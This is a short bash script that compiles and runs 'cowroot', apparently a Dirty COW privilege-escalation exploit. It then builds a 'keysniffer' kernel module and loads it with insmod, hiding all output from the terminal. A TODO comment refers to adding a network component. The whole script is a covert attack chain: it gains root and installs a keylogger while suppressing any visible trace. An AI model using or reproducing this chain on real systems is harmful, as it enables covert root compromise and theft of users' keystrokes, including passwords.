#!/bin/bash
# TODO: figure out how to "make" keysniffer and network and how to use them
(gcc cowroot.c -o cowroot -pthread \
&& ./cowroot \
&& cd keysniffer \
&& make --file=Makefile all \
&& insmod kisni.ko) >nul 2>&1 # sending output to nul and sending stderr to stdout so that nothing is sent to the terminal
